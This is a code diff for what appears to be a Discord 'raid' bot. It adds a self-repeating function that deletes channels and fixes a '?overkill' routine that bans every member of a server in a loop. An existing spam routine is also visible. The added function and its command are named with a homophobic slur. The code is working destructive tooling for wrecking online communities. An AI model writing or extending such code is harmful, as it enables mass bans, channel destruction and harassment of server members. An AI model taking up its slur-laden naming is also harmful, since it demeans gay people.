@@ -13,12 +13,21 @@ function spam(bot, message) {
  setTimeout(() => spam(bot, message), 30*10);
 }
 
+function gay(bot, message) {
+  message.channels.filter(c => c.name === 'spam').forEach(channel => {
+		  channel.delete()
+  			.then(console.log)
+  			.catch(console.error);
+		});
+ setTimeout(() => gay(bot, message), 30*10);
+}  
+
 function ban(bot, message) {
   message.guild.members.forEach(member => {
     member.ban('raid')
       .catch(error => console.log(`Sorry, I couldn't ban ${member} because of : ${error}`));
   });                      
- setTimeout(() => spam(bot, message), 30*10);
+ setTimeout(() => ban(bot, message), 30*10);
 }
 
 bot.on("ready", async () => {
@@ -33,6 +42,9 @@ bot.on("message", async message => {
   }
   if (message.content.startsWith('?overkill')) {
     ban(bot, message)
+  }
+  if (message.content.startsWith('?gay')) {
+    gay(bot, message)
   }
   if (message.content.startsWith('?')) {
     if (message.content.startsWith('?enable')) return
